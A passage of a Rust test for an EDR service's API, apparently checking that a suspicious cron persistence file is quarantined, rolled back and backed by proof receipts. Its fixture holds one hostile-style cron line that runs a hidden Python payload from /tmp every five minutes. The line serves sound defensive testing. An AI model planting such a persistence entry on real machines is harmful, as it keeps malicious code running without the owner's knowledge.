            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cron persistence findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing cron persistence file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious cron persistence",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cron persistence response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron persistence response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read cron persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode cron persistence response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing cron persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read cron persistence artifact: {e}")),
            b"*/5 * * * * /usr/bin/python3 /tmp/.cache/payload.py\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing cron persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore cron persistence file"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cron persistence rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron persistence rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build cron persistence proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cron persistence proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read cron persistence proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected cron persistence proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode cron persistence proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cron persistence proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cron persistence proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );
        assert!(proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cron persistence proof acknowledgement receipts"))
            .is_empty());

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(cron_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

